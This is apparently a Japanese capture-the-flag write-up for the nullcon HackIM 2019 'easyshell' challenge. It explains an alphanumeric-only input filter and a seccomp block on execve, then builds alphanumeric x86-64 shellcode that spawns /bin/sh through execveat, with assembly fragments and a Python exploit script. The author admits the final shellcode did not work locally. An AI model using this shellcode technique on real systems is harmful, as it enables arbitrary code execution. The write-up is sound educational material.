# [pwn 451pts] easyshell - nullcon HackIM 2019
64ビットでPIEやSSPなども有効になっています。
```
$ checksec gg
[*] 'gg'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Full RELRO
    PIE:        PIE enabled
```
IDAで見ると、最初にmmapで実行可能領域を確保して、そこへreadで入力した後その領域がcallされます。
なのですが、readした後に入力データを1バイトずつチェックしているようです。
`__ctype_b_loc`関数なるものを使っているのですが、調べるとunsigned shortの配列を返すようです。
この配列は文字コードから文字の種別を判定できる便利な配列で、例えば
```c
__ctype_b_loc()[sizeof(unsigned short) * c]
```
のようにして文字の種類を知ることができます。
種類は次のように定義されています。
```c
enum
{
  _ISupper = _ISbit (0),        /* UPPERCASE.  */
  _ISlower = _ISbit (1),        /* lowercase.  */
  _ISalpha = _ISbit (2),        /* Alphabetic.  */
  _ISdigit = _ISbit (3),        /* Numeric.  */
  _ISxdigit = _ISbit (4),       /* Hexadecimal numeric.  */
  _ISspace = _ISbit (5),        /* Whitespace.  */
  _ISprint = _ISbit (6),        /* Printing.  */
  _ISgraph = _ISbit (7),        /* Graphical.  */
  _ISblank = _ISbit (8),        /* Blank (usually SPC and TAB).  */
  _IScntrl = _ISbit (9),        /* Control character.  */
  _ISpunct = _ISbit (10),       /* Punctuation.  */
  _ISalnum = _ISbit (11)        /* Alphanumeric.  */
};
```
今回のバイナリは各文字が0x0C00と一致するか比較しています。
`_ISbit`はビットシフトしたものなので、0x0C=0b1100より`_ISbit(2) | _ISbit(3)`となり、英数字であればOKです。
したがって、英数字のみでシェルコードを作る問題ということになります。
ただし、何回も入力できるのでシェルコードを複数に分けても良さそうです。

[こちら](https://hama.hatenadiary.jp/entry/2017/04/04/190129)を参考にして
```
ATYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA
```
というシェルコードを作ったのですが動きませんでした。
おかしいと思ってよく処理を見ると`sys_execve`がseccompで弾かれていました。
悲しいかな。

ということで`stub_execveat`を使った英数字シェルコードを書きましょう。

## 1. rax
`stub_execveat`のシステムコール番号は0x142です。
初期状態でrax=0なので、次のようにして作ります。
```nasm
xor ax, 0x3070
xor ax, 0x3132
```
これで`f5p0f521`です。

## 2. rdi
`stub_execveat`においてrdiはdirfdという特別な役割を果たしますが、pathnameが絶対パスの場合無視されるので適当な値で問題無いでしょう。

## 3. rdx, r10, r8
rdxはargv, r10はenvp, r8はflagsなのでいずれも0にしましょう。
raxを変更する前に次のようにします。
```nasm
push rax
push rax
push rax
pop rdx
pop r10
pop r8
```
これで`PPPZAZAX`です。

## 4. rsi
rsiは`/bin/sh`を指している必要があります。
これは最初のシェルコードと同様にrcxを使ってxorしましょう。
```
0x30 ^ 0x6e == 0x5e ; pop rsi
0x41 ^ 0x4e == 0x0f ; syscall
0x41 ^ 0x44 == 0x05
0x41 ^ 0x41 == 0x00 ; (bad)
nRYZnCXA ^ A004A00A == /bin/sh\x00
```
こんな感じでxorします。
```nasm
push 0x34303041
pop rax
xor DWORD PTR [rcx+0x34], eax
```
この場合`hA004X1A4`となります。
`pop rsi`するのであらかじめ`/bin/sh`のポインタをpushする必要があります。
```nasm
push rcx
pop rax
xor al, 0x??
push rax
```
これで`PQX4?PYXQ`になります。
mmapで確保したアドレスは0x1000でアラインされるのでclは0x00です。
ただし、最初にrcxにr12を代入するのを忘れないように。
```nasm
push r12
pop rcx
```
これは`ATY`です。
あとは破壊したraxを0x00に戻してから1でシステムコール番号を用意します。
```nasm
push rdx ; R
pop rax  ; X
```

ということでシェルコードを作ったのですが私の環境では動きませんでした。
execveatって動かないの？
```python
from ptrlib import *

sock = Socket("127.0.0.1", 4010)
_ = input()

shellcode = ""
# padding
shellcode += "PXPXPXPXPXPX"
# set rdx, r10, r8 = 0
shellcode += "PPPZAZAX"
# set rcx = r12
shellcode += "ATY"
# xor [rcx+0x41], 0x41414130
shellcode += "h0AAAX1AA"
# xor [rcx+0x45], 0x34303041
shellcode += "hA004X1AE"
# xor [rcx+0x49], 0x41303041
shellcode += "hA00AX1AI"
# push rcx = &'/bin/sh'
shellcode += "QX4EP"
# set rax = 0x142
shellcode += "RXf5p0f521"
# pop rsi; syscall; (bad)
shellcode += "nNDA"
# /bin/sh\x00
shellcode += "nRYZnCXA"
print(shellcode)
sock.send(shellcode)
sock.interactive()
```

公式writeupによるとflagというファイルを出力するそうです。
flagっていうファイル名を問題文で提供していないのはどうかと......

# 感想
alphanumericなshellcodeを勉強したい方は是非挑戦してください。
